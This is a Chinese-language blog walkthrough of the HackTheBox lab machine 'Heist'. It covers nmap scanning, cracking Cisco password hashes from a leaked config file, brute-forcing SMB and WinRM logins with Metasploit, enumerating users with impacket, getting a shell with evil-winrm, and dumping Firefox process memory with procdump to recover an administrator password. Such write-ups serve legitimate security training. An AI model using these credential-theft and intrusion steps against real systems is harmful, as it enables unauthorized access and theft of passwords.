<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>HTB Heist Writeup · Ikonw</title><meta name="description" content="HTB Heist Writeup - Ikonw"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/gandalfr.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/styles/solarized-light.min.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Ikonw"><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="https://p4.itc.cn/q_70/images03/20230225/87c56a7134574d718cd48f0955a962f4.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li><!-- Search Bar--><li style="margin-top: 10px;" class="nav-list-item"><form action="/search" method="GET"><input type="text" name="query" placeholder="Search" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; margin-right: 5px; width: 200px;"><button type="submit" style="padding: 8px 12px; border: none; border-radius: 4px; background-color: #007bff; color: white; cursor: pointer;"> </button></form></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">HTB Heist Writeup</h1><div class="tags"><a href="/tags/hackthebox/" class="tag-title">#hackthebox</a></div><div class="post-info">Jan 26, 2020</div><div class="post-content"><h1 id="No-4-Heist-难度简单-HTB-walkthrough"><a href="#No-4-Heist-难度简单-HTB-walkthrough" class="headerlink" title="No.4-Heist-难度简单-HTB-walkthrough"></a>No.4-Heist-难度简单-HTB-walkthrough</h1><p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/old-machine-images/20200126112412354.png" alt="在这里插入图片描述"></p>
<h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC heist.htb</span><br><span class="line">1</span><br><span class="line">Nmap scan report <span class="keyword">for</span> heist.htb (10.10.10.149)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-title: Support Login Page</span><br><span class="line">|_Requested resource was login.php                                                                                                                                                                                                         </span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                          </span><br><span class="line">445/tcp open  microsoft-ds?                                                                                                                                                                                                                </span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                                                   </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Host script results:                                                                                                                                                                                                                       </span><br><span class="line">|_clock-skew: 4s                                                                                                                                                                                                                           </span><br><span class="line">| smb2-security-mode:                                                                                                                                                                                                                      </span><br><span class="line">|   2.02:                                                                                                                                                                                                                                  </span><br><span class="line">|_    Message signing enabled but not required                                                                                                                                                                                             </span><br><span class="line">| smb2-time:                                                                                                                                                                                                                               </span><br><span class="line">|   <span class="built_in">date</span>: 2020-01-25T01:23:05                                                                                                                                                                                                              </span><br><span class="line">|_  start_date: N/A                                                                                                                                                                                                                        </span><br><span class="line">1234567891011121314151617181920212223242526</span><br></pre></td></tr></table></figure>

<h1 id="二，HTTP-Enumeration"><a href="#二，HTTP-Enumeration" class="headerlink" title="二，HTTP Enumeration"></a>二，HTTP Enumeration</h1><p>进入web, 是个登陆页面。 并没有找到CMS, 右下角有个 <strong>Login as guest</strong><br><img src="/images/old-machine-images/20200126114331293.png" alt="在这里插入图片描述"><br>发现这是个 类似于 <strong>Support desk</strong> 的平台。<br><img src="/images/old-machine-images/20200126113042235.png" alt="在这里插入图片描述"><br>点击 Attachment 跳转到 config.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">version 12.2</span><br><span class="line">no service pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router bgp 100</span><br><span class="line"> synchronization</span><br><span class="line"> bgp log-neighbor-changes</span><br><span class="line"> bgp dampening</span><br><span class="line"> network 192.168.0.0Â mask 300.255.255.0</span><br><span class="line"> timers bgp 3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">dialer-list 1 protocol ip list 101</span><br><span class="line">!</span><br><span class="line">no ip http server</span><br><span class="line">no ip http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization <span class="built_in">exec</span> SSH</span><br><span class="line"> transport input ssh</span><br><span class="line">1234567891011121314151617181920212223242526272829303132333435363738394041</span><br></pre></td></tr></table></figure>

<p>其中有三行是包含哈希值的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span>  // Type 5 </span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713 //Type 7 </span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 //type 7 </span><br><span class="line">1234</span><br></pre></td></tr></table></figure>

<p>按照之前所说的，这应该分别CISCO的哈希值。<br>分别为 type 5 跟 type 7。type 5是有salt过的。<br>利用网上的工具来进行破解。</p>
<p><img src="/images/old-machine-images/20200126114855103.png" alt="在这里插入图片描述"><br>Type 5 的比较麻烦，网上的工具没能找到密码。<br>找到一个 <a target="_blank" rel="noopener" href="https://github.com/axcheron/cisco_pwdecrypt">github脚本</a>。<br><img src="/images/old-machine-images/20200126115301683.png" alt="在这里插入图片描述"><br>现在我们已经找到全部的账号和密码</p>
<table>
<thead>
<tr>
<th>账号</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td>$uperP@ssword</td>
</tr>
<tr>
<td>rout3r</td>
<td>Q4)sJu\Y8qz*A3?d</td>
</tr>
<tr>
<td>Hazard</td>
<td>stealth1agent</td>
</tr>
</tbody></table>
<h1 id="三，拿到shell"><a href="#三，拿到shell" class="headerlink" title="三，拿到shell"></a>三，拿到shell</h1><p>尝试使用现有的账号和密码 来登陆网页，但提示需要用邮箱。利用了例子如 <strong><a href="mailto:&#97;&#x64;&#109;&#x69;&#110;&#64;&#104;&#x65;&#105;&#x73;&#x74;&#x2e;&#104;&#x74;&#x62;">&#97;&#x64;&#109;&#x69;&#110;&#64;&#104;&#x65;&#105;&#x73;&#x74;&#x2e;&#104;&#x74;&#x62;</a></strong><br>也没有进展。</p>
<p>利用metasploit 的smblogin 来进行爆破。<br><img src="/images/old-machine-images/202001261158540.png" alt="在这里插入图片描述"><br>发现只有 <strong>Hazrd:stealth1agent</strong> 可以登陆<br>发现权限都是No Access和READ。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@xing<span class="comment"># smbmap -H 10.10.10.149 -u hazard -p stealth1agent</span></span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session establishd on 10.10.10.149...</span><br><span class="line">[+] IP: 10.10.10.149:445        Name: 10.10.10.149                                      </span><br><span class="line">        Disk                                                    Permissions</span><br><span class="line">        ----                                                    -----------</span><br><span class="line">        ADMIN$                                                  NO ACCESS</span><br><span class="line">        C$                                                      NO ACCESS</span><br><span class="line">        IPC$                                                    READ ONLY</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure>

<blockquote>
<p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
</blockquote>
<p>在这里我们可以利用 <strong>READ ONLY</strong> 的IPC$来取得本地账号的信息。</p>
<p>利用rpclient来连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;Hazard%stealth1agent&quot;</span> heist.htb</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><img src="/images/old-machine-images/20200126121648687.png" alt="在这里插入图片描述"><br>我们也可以同样利用SID来获取用户名<br>sid的后四位是用户的编号，我们可以通过逐渐增加来找到本机的用户名字</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><img src="/images/old-machine-images/20200126121846444.png" alt="在这里插入图片描述"><br>发现多三个用户为 Chase,support,Jason。</p>
<p>另外一个方法是用 <strong>impacket</strong> (好东西呀）。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@xing:/opt<span class="comment"># locate lookupsid.py</span></span><br><span class="line">/usr/share/doc/python3-impacket/examples/lookupsid.py</span><br><span class="line"></span><br><span class="line">root@xing:/opt<span class="comment"># python /usr/share/doc/python3-impacket/examples/lookupsid.py Hazard:stealth1agent@10.10.10.149</span></span><br><span class="line">Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Brute forcing SIDs at 10.10.10.149</span><br><span class="line">[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112</span><br><span class="line">500: SUPPORTDESK\Administrator (SidTypeUser)</span><br><span class="line">501: SUPPORTDESK\Guest (SidTypeUser)</span><br><span class="line">503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span><br><span class="line">504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span><br><span class="line">513: SUPPORTDESK\None (SidTypeGroup)</span><br><span class="line">1008: SUPPORTDESK\Hazard (SidTypeUser)</span><br><span class="line">1009: SUPPORTDESK\support (SidTypeUser)</span><br><span class="line">1012: SUPPORTDESK\Chase (SidTypeUser)</span><br><span class="line">1013: SUPPORTDESK\Jason (SidTypeUser)</span><br><span class="line">123456789101112131415161718</span><br></pre></td></tr></table></figure>

<p>尝试了各种组合还是无法登陆smb或者web。<br>于是决定再扫一遍nmap 看看有没有什么高端口是漏掉的。<br>发现了5985端口开着</p>
<blockquote>
<p>WinRM 是windows 一种方便远程管理的服务；开启winrm service,便于在日常工作中，远程管理服务器，或通过脚本，同时管理多台服务器，来提高工作效率</p>
</blockquote>
<p><img src="/images/old-machine-images/20200126145922341.png" alt="在这里插入图片描述"><br>这边可以利用一种工具叫evil-winrm 来进行登陆。</p>
<p>有兴趣的可以了解更多<br><a target="_blank" rel="noopener" href="https://www.uedbox.com/post/58739/">Evil-winRM 远程管理shell</a></p>
<p>首先，利用metasploit 的 <strong>scanner&#x2F;winrm&#x2F;winrm_login</strong> 模块来爆破帐号和密码。<br>（这么多帐号和密码 到底哪个密码是哪个呀）。</p>
<p>把新取得的账号 全部保存进 possible_user。<br>然后根据lookupsid取得的 DOMAIN填写。</p>
<p><img src="/images/old-machine-images/20200126150720402.png" alt="在这里插入图片描述"></p>
<p><img src="/images/old-machine-images/20200126150815832.png" alt="在这里插入图片描述"></p>
<p>成功取得有效登陆</p>
<p><strong>Chase:Q4)sJu\Y8qz*A3?d</strong></p>
<p>利用evil-winrm 进行登陆</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p <span class="string">&quot;Q4)sJu\Y8qz*A3?d&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/old-machine-images/20200126151024557.png" alt="在这里插入图片描述"></p>
<h1 id="四，提权"><a href="#四，提权" class="headerlink" title="四，提权"></a>四，提权</h1><p>一番探索后 发现有 <strong>firefox</strong> 的程序再跑<br><img src="/images/old-machine-images/2020012615214765.png" alt="在这里插入图片描述"><br>利用微软的procdump把 firefox的日志</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></p>
<p>利用 evil-winrm 上传 procdump.exe 然后执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload proxdump.exe</span><br><span class="line">procdump -ma 2892</span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p>后面用 grep 找出admin 后发现密码。<br><img src="/images/old-machine-images/20200126170033546.png" alt="在这里插入图片描述"><br>使用evil win-rm 登陆后 取到 root flag</p>
<br/>
<br/>
<br/>

<p><img src="/images/root.gif" alt="root"></p>
</div></article></div></main><footer><div class="paginator"><a href="/2020/02/10/HTB-jeeves/" class="prev">PREV</a><a href="/2020/01/22/HTB-jarvis/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 - 2023 <a href="http://example.com">Ikonw</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/MikeCoder/hexo-theme-gandalfr" target="_blank">hexo-theme-gandalfr</a>.</p></div></footer></div><script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js" crossorigin="anonymous"></script><script src="//cdn.bootcss.com/jquery/3.1.1/jquery.js" crossorigin="anonymous"></script><script>$(document).ready(function() { hljs.configure({useBR: true}); $('pre').each(function(i, block) { hljs.highlightBlock(block); }); });</script></body></html>